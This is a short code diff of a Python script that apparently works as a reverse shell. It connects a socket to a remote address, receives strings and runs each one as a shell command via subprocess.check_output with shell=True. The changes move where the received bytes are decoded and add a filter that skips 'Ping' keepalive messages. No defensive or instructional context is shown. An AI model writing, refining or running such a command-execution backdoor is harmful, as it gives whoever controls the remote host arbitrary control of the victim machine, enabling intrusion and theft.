@@ -22,7 +22,7 @@ def get_ip():
 
 def handle_payload(cmd, *args, **kwargs):
     # cli_args = args + kwargs.items()
-    command_payload = [cmd.decode('utf-8')] + list(args)
+    command_payload = [cmd] + list(args)
     response = subprocess.check_output(command_payload, shell=True)
     return response
 
@@ -50,7 +50,9 @@ def main(sock_addr, sock_port):
         print(connected_msg)
         while True:
             try:
-                data = sock.recv(1024)
+                data = sock.recv(1024).decode('utf-8')
+                # check/filter connection 
+                if data == 'Ping': continue
                 print(f'Received at : {datetime.now()} << {data}')
                 # handle payload
                 capture = handle_payload(cmd=data)
